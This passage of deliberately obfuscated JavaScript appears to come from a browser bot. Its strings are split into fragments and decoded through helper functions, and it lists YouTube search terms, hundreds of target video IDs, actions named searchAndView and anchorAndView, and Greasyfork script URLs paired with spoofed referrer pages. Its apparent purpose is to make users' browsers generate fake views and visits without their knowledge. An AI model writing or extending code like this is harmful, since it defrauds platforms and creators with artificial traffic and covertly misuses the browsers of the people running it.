searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + W(0x4) + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + X(0x9, 'lC98') + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x2523 + 0xbbc + -0x30d5)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xa1a + 0x20b2 + -0x2ac2)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + X(0xb, '^tys') + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x2 * -0x67a + -0x4 * 0x11b + 0x1163);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    V(0x13) + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    V(0x1d) + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    W(0x8) + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    W(0x12) + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    X(0x1e, 'W*f&') + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + W(0xf),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + X(0x15, 'I[Xc'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + X(0x2, '#]M0') + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': W(0x1c) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x0, 'U#Y)') + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + X(0x1a, 'YP(^') + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': V(0x11) + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
